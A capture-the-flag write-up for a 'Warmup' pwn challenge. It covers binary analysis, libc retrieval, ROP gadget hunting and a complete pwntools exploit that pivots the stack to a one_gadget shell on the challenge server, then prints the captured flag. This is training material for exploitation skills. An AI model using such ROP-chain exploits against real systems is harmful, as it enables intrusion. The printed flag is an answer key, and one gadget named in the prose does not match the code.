https://ctftime.org/event/2222

# Warmup (PWN)

Here's something to get you warmed up, spin that gdb up.

nc 172.210.129.230 1338

## Binary Analysis

- `main` @ `0x004011da`
    - reads up to 0x200 bytes into `name`
    - reads up to 0x58 bytes into a buffer onto the stack such that we control the return address

- `okey` @ `0x00401186`
    - provides us with a `pop rsp` gadget

So we must:
1) Write shellcode to `name`
2) Stack pivot, using the provided `pop rsp` gadget, to `name`.

## Getting libc.so.6

We can see from the `Dockerfile` that the task is using `ubuntu:latest`:

```
FROM ubuntu:latest

RUN apt-get update
RUN apt-get install socat -y

EXPOSE 1338

RUN useradd ctf

WORKDIR /chal
COPY warmup /chal
COPY flag.txt /chal

USER ctf

CMD ["socat", "tcp-l:1338,reuseaddr,fork", "EXEC:./warmup"]
```

We can grab that version of `libc.so.6` using ret's libc command:

```
$ ret libc ubunutu:latest
📥 adding "/tmp/ret-libc-2865571937/ubunutu:latest.libc.so.6" fc4c52f3910ed57a088d19ab86c671358f5e917cd4e95b21fd08e4fd922c0aa2
```

https://github.com/rerrorctf/ret/blob/main/commands/libc.go

Note that, due to the use of the `ubuntu:latest` tag, it is possible that you will get a `libc.so.6` with a different hash.

## Gadgets

Our provided `pop rsp` gadget:

```
$ ROPgadget --binary ./warmup | grep -E ": pop rsp"
0x000000000040118e : pop rsp ; ret
```

```
$ one_gadget ./libc.so.6 
0x583dc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17302e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

```

We need a gadget to write the address of the `one_gadget` to another region of writable memory that can function as a stack:

```
$ ROPgadget --binary ./libc.so.6 | grep -E ": mov qword ptr \[[a-z]{3}\], [a-z]{3} ; ret$"
0x000000000003b1e7 : mov qword ptr [rax], rdx ; ret
0x000000000009a077 : mov qword ptr [rcx], rdx ; ret
0x00000000000bf466 : mov qword ptr [rdi], rcx ; ret
0x00000000000bcb90 : mov qword ptr [rdi], rdx ; ret
0x000000000003ba60 : mov qword ptr [rdx], rax ; ret
0x00000000000b4644 : mov qword ptr [rdx], rcx ; ret
0x000000000013b961 : mov qword ptr [rsi], rdi ; ret
0x000000000005ad5a : mov qword ptr [rsi], rdx ; ret
```

We need a gadget, or set of gadgets, to conform with the `one_gadget` constraints:

```
$ ROPgadget --binary ./libc.so.6 | grep -E "pop rdx.*xor eax, eax.*; ret$"
0x00000000000b502c : pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
```

We can combine this, specifically the `pop rdx` part, with the `mov qword ptr [rdx], rsi` gadget above.

## Solution

One problem that I encountered was that when getting the shell `rsp` would end up pointing to a non-writable region of memory. To account for this I reuse the `pop rsp` gadget to set `rsp` to something more suitable prior to returning to the `one_gadget`'s address:

You can see the writable regions here. If we aim for the end of 0x404000 it will probably work well enough as a stack to avoid the crashes:

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
             Start                End Perm     Size Offset File
          0x400000           0x401000 r--p     1000      0 /home/user/ctf/warmup/warmup
          0x401000           0x402000 r-xp     1000   1000 /home/user/ctf/warmup/warmup
          0x402000           0x403000 r--p     1000   2000 /home/user/ctf/warmup/warmup
          0x403000           0x404000 r--p     1000   2000 /home/user/ctf/warmup/warmup
          0x404000           0x405000 rw-p     1000   3000 /home/user/ctf/warmup/warmup
    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7c28000     0x7ffff7db0000 r-xp   188000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7db0000     0x7ffff7dff000 r--p    4f000 1b0000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7dff000     0x7ffff7e03000 r--p     4000 1fe000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e03000     0x7ffff7e05000 rw-p     2000 202000 /usr/lib/x86_64-linux-gnu/libc.so.6
    0x7ffff7e05000     0x7ffff7e12000 rw-p     d000      0 [anon_7ffff7e05]
    0x7ffff7f9e000     0x7ffff7fa1000 rw-p     3000      0 [anon_7ffff7f9e]
    0x7ffff7fbd000     0x7ffff7fbf000 rw-p     2000      0 [anon_7ffff7fbd]
    0x7ffff7fbf000     0x7ffff7fc3000 r--p     4000      0 [vvar]
    0x7ffff7fc3000     0x7ffff7fc5000 r-xp     2000      0 [vdso]
    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7fc6000     0x7ffff7ff1000 r-xp    2b000   1000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ff1000     0x7ffff7ffb000 r--p     a000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  36000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  38000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
    0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 [stack]
0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

Note that the `one_gadet` requires that `rsp & 0xf == 0`. This was achieved through simple trial and error of the `FAKE_STACK` location adding or subtracting 0x8 bytes until it is correct.

```python
from pwn import *

elf = ELF("./warmup", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="b *0x401280")
p = remote("172.210.129.230", 1338)

leak = int(p.readline().decode(), 16)
libc.address = leak - libc.sym["puts"]
log.success(f"libc: 0x{libc.address:X}")

p.readuntil(b"name>> ")

ONE_GADGET = libc.address + 0x583dc # rax=0 rbx=0 rsp&0xf=0
MOV_RSI_RDX = libc.address + 0x000000000005ad5a
POP_RDX_XOR_EAX_EAX_POP_RBX_POP_R12_POP_R13 = libc.address + 0x00000000000b502c
POP_RSI_POP_R15 = libc.address + 0x000000000010f759
POP_RSP = 0x000000000040118e
FAKE_STACK = 0x405000 - 0x208

payload = b""
payload += p64(POP_RSI_POP_R15)
payload += p64(FAKE_STACK)
payload += p64(0)
payload += p64(POP_RDX_XOR_EAX_EAX_POP_RBX_POP_R12_POP_R13)
payload += p64(ONE_GADGET)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(MOV_RSI_RDX)
payload += p64(POP_RSP)
payload += p64(FAKE_STACK)
p.sendline(payload)

p.readuntil(b"alright>> ")

payload = b"B" * 0x48
payload += p64(POP_RSP)
payload += p64(elf.symbols["name"])
p.sendline(payload)

p.clean()

p.sendline(b"/bin/cat flag.txt")

p.interactive()
```

## Flag
`AKASEC{1_Me44444N_J00_C0ULDve_ju57_574CK_p1V07ed}`

smiley 2024/06/08
